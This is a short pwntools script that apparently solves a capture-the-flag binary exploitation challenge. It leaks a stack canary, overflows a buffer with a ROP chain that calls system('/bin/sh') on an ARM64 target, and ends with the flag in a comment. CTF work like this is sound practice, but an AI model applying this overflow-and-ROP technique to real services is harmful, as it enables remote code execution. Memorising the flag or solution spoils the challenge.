from pwn import *

# p = process(["./run.sh"])

p = remote("chal.wwctf.com",32804)


# get canary leak first
p.sendline(b"/bin/sh ;".ljust(64,b"A"))
p.recvuntil("me: ")
p.recvline()
canary = u64(p.recvline()[:7].strip().ljust(8,b"\x00")) << 8 
print("canary",hex(canary))


# setup a simple system bin_sh rop


system = 0x401B00
main = 0x40072C
ret = 0x04007F4

# 0x00000000004562f8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
pop_x0 = 0x00000000004562f8

bin_sh = 0x466608
p.sendline(cyclic(32) + p64(canary) + b"A" * 8 +  p64(pop_x0) +  cyclic(24) + p64(system) + p64(bin_sh) ) 





p.interactive()

# wwf{w0W_you_5uCcEs5_aRM_r0p!!}